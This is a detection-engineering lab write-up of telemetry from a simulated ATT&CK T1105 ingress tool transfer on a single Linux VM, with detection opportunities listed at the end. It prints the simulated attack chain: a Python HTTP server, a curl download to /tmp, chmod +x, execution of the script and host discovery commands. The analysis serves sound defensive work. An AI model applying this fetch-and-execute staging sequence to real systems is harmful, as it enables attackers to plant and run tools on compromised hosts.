# Telemetry Analysis: Rogue HTTP Server (T1105 – Ingress Tool Transfer)

## Overview

This document analyzes telemetry generated during the Rogue HTTP Server simulation conducted as part of the Detection Engineering Laboratory.

The objective of the simulation was to emulate ATT&CK T1105 (Ingress Tool Transfer) by staging a payload through a temporary Python HTTP server and transferring the payload onto a previously compromised Linux host. The payload was subsequently executed to generate additional telemetry for investigation and detection development.

The simulation was executed within a single Linux virtual machine where both attacker and victim activities occurred on the same host. Although the infrastructure was simplified, the resulting telemetry closely resembles real-world post-compromise tool staging behavior.

---

# Scenario Summary

## ATT&CK Technique

**T1105 – Ingress Tool Transfer**

## Scenario Assumptions

The target system is assumed to be compromised prior to the start of the simulation.

The attacker already possesses command execution on the host and uses a temporary HTTP server to transfer additional tooling onto the compromised system.

## Simulated Attack Flow

```text
Attacker Shell
        │
        ├── python3 -m http.server 8000
        │
        ├── curl http://127.0.0.1:8000/updater.sh
        │
        ├── chmod +x /tmp/updater.sh
        │
        └── /tmp/updater.sh
                  │
                  ├── whoami
                  ├── id
                  └── hostname
```

---

# Telemetry Overview

The simulation generated telemetry across multiple data sources that collectively describe the complete attack lifecycle.

The observed activity can be divided into five major stages:

1. Rogue HTTP server creation
2. Payload transfer
3. File creation and staging
4. Permission modification
5. Payload execution

The telemetry provides visibility into process creation, network activity, file system activity, and parent-child process relationships.

---

# Telemetry Sources

## Sysmon for Linux

Sysmon provided high-fidelity process creation telemetry and process lineage information.

### Primary Visibility

* Python HTTP server execution
* Curl execution
* Chmod execution
* Payload execution
* Child process creation
* Parent-child process relationships

### Value

Sysmon enables reconstruction of the complete attack chain and provides context regarding process ancestry.

---

## auditd EXECVE

Auditd EXECVE records captured command execution and command-line arguments.

### Primary Visibility

* Exact executed commands
* Command arguments
* Execution timestamps
* Process identifiers
* Parent process identifiers

### Value

Auditd provides authoritative command-line visibility and allows investigators to determine exactly what actions were performed.

---

## auditd File Activity (/tmp Watch)

Directory monitoring was configured on `/tmp`.

### Primary Visibility

* Payload creation
* Permission modifications
* File attribute changes

### Value

This telemetry identifies where transferred tools are stored and provides visibility into staging behavior frequently associated with attacker activity.

---

## Process Tree Collection

Process tree snapshots were collected using process inspection utilities.

### Primary Visibility

* Process hierarchy
* Parent-child relationships
* Interactive shell context

### Value

Process trees assist investigators in understanding attack progression and execution flow.

---

# Telemetry Breakdown

## Phase 1 – Rogue HTTP Server Activation

### Observed Activity

A Python HTTP server was launched using:

```bash
python3 -m http.server 8000
```

### Telemetry Generated

#### Sysmon

Observed:

* python3 execution
* Parent shell process
* Command-line arguments

#### auditd EXECVE

Observed:

* Exact command execution
* Process identifiers
* Execution timestamp

### Investigative Significance

This activity established a temporary staging service capable of hosting attacker-controlled content.

From an investigative perspective, Python spawning a listening HTTP service is uncommon on many production Linux systems and may warrant additional scrutiny.

---

## Phase 2 – Tool Transfer

### Observed Activity

A payload was retrieved from the HTTP server using:

```bash
curl http://127.0.0.1:8000/updater.sh -o /tmp/updater.sh
```

### Telemetry Generated

#### Sysmon

Observed:

* curl execution
* Parent shell relationship

#### auditd EXECVE

Observed:

* Full curl command line
* Destination file path

### Investigative Significance

This event represents the primary T1105 behavior.

The transfer demonstrates a payload moving from an attacker-controlled staging location to a local file system location.

Investigators should identify:

* Download utility used
* Source location
* Destination path
* Associated parent process

---

## Phase 3 – File Creation

### Observed Activity

The payload was written to:

```text
/tmp/updater.sh
```

### Telemetry Generated

#### auditd File Activity

Observed:

* File creation
* File path
* Creation operation

### Investigative Significance

Temporary directories are commonly used for staging malicious tooling.

The appearance of executable scripts within `/tmp` frequently serves as an indicator of post-compromise activity.

Investigators should determine:

* Who created the file
* Which process created the file
* Whether the file was subsequently executed

---

## Phase 4 – Permission Modification

### Observed Activity

The payload was prepared for execution using:

```bash
chmod +x /tmp/updater.sh
```

### Telemetry Generated

#### Sysmon

Observed:

* chmod execution

#### auditd EXECVE

Observed:

* Full chmod command

#### auditd File Activity

Observed:

* File attribute modification

### Investigative Significance

Permission modification frequently occurs immediately before payload execution.

This activity is often observed within attacker workflows involving downloaded scripts and tools.

Investigators should correlate:

```text
File Creation
        ↓
Permission Modification
        ↓
Execution
```

to identify suspicious execution chains.

---

## Phase 5 – Payload Execution

### Observed Activity

The transferred script was executed:

```bash
/bin/bash /tmp/updater.sh
```

The script subsequently launched:

```bash
whoami
id
hostname
```

### Telemetry Generated

#### Sysmon

Observed:

* Payload execution
* Child process creation
* Parent-child relationships

#### auditd EXECVE

Observed:

* Script execution
* Discovery command execution

### Investigative Significance

Execution of recently downloaded files from temporary directories is a common post-compromise pattern.

The subsequent discovery commands indicate attacker interest in understanding user context and host identity.

---

# Reconstructed Attack Chain

The complete attack sequence reconstructed from telemetry is:

```text
bash
    │
    ├── python3 -m http.server 8000
    │
    ├── curl http://127.0.0.1:8000/updater.sh
    │
    ├── chmod +x /tmp/updater.sh
    │
    └── /bin/bash /tmp/updater.sh
             │
             ├── whoami
             ├── id
             └── hostname
```

This sequence demonstrates a complete ingress tool transfer workflow followed by execution and host discovery.

---

# Investigation Foundations

The collected telemetry enables investigators to answer several critical questions.

## Payload Download through curl interaction

The payload was downloaded using curl from a locally hosted Python HTTP server.

---

## Payload written to temporary location

The payload was written to:

```text
/tmp/updater.sh
```

---

## Payload modified to be able to execute

The executable bit was added using:

```bash
chmod +x /tmp/updater.sh
```

---

## Payload Execution 

The payload was executed through:

```bash
/bin/bash /tmp/updater.sh
```

---

## Discovery through Payload

The payload executed:

```bash
whoami
id
hostname
```

---

## Attack Chain Reconstruction

Sysmon and auditd collectively provide sufficient visibility to reconstruct the entire attack lifecycle.

---

# Detection Engineering Takeaways

Several high-value detection opportunities emerge from this simulation.

## Detection Opportunity 1

### Suspicious Python HTTP Server

Indicators:

```text
python3 -m http.server
```

Potential Logic:

Detect Python spawning an HTTP service on a listening port.

---

## Detection Opportunity 2

### Tool Transfer Activity

Indicators:

```text
curl
wget
```

combined with:

```text
file creation
```

Potential Logic:

Detect download utilities writing files to temporary directories.

---

## Detection Opportunity 3

### Download → Permission Change → Execute

Indicators:

```text
curl
        ↓
/tmp file creation
        ↓
chmod +x
        ↓
execution
```

Potential Logic:

Correlate file download, permission modification, and execution events within a defined time window.

---

## Detection Opportunity 4

### Execution from Temporary Directories

Indicators:

```text
/tmp/
/var/tmp/
/dev/shm/
```

Potential Logic:

Detect executable content launched from temporary locations.

---

## Detection Opportunity 5

### Tool Transfer Followed by Discovery

Indicators:

```text
download
        ↓
execution
        ↓
whoami
id
hostname
```

Potential Logic:

Identify staged tooling immediately followed by reconnaissance activity.

---

# Conclusion

The Rogue HTTP Server simulation successfully generated telemetry representative of ATT&CK T1105 (Ingress Tool Transfer).

The collected Sysmon and auditd telemetry provided complete visibility into staging service creation, payload transfer, file creation, permission modification, payload execution, and subsequent discovery activity.

The resulting telemetry forms a strong foundation for the next phases of the detection engineering workflow, including investigation, ATT&CK mapping, behavioral analytics development, Sigma rule creation, and validation testing.
